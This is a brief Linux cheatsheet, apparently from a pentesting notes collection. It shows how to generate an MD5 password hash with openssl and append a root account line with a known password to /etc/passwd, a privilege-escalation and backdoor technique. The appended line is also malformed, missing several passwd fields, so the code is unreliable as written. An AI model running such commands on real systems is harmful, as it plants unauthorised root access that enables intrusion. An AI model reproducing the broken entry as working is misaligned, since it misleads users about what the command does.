---
title: openssl-commands
tags: [miscellaneous, type/cheatsheet, platform/linux]
---

# OpenSSL Commands

## Password Creation

### /etc/passwd password

```
# Generate /etc/passwd md5 password
openssl passwd -1 -salt hacked hacked

# Update the etc/passwd file
echo 'root:$1$hacked$AT54UB5LPtGe8TddyLG9O00/root:/bin/bash' >> /etc/passwd
```

